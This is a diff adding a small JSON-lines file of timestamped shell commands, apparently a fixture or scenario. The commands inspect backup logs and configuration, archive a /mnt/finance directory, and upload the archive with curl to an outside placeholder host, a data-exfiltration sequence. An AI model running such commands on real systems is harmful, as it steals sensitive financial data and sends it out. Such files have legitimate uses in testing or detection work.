@@ -1,0 +1,6 @@
+{"t": 0, "payload": "ls -la /var/backups"}
+{"t": 7, "payload": "tail -n 50 /var/backups/backup.log"}
+{"t": 15, "payload": "cat /etc/backup/backup.conf"}
+{"t": 22, "payload": "ls -la /mnt/finance"}
+{"t": 30, "payload": "tar czf /tmp/f.tgz /mnt/finance"}
+{"t": 41, "payload": "curl -s -T /tmp/f.tgz https://files.example/upload"}
